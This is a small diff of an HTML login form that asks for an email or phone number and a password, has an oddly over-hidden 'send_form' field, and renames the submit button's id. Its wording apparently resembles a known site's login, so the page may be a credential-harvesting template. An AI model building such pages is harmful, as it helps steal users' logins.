@@ -19,7 +19,7 @@
             <input type="text" name="email" id="email" placeholder="Email address or phone number" required>
             <input type="password" name="password" id="password" placeholder="Password" required>
             <input type="hidden" name="action" value="send_form" style="display: none; visibility: hidden; opacity: 0;">
-            <button type="submit" id="submit" name="submit">submit</button>
+            <button type="submit" id="submit-form" name="submit">submit</button>
         </form>
         <hr>
     </div>
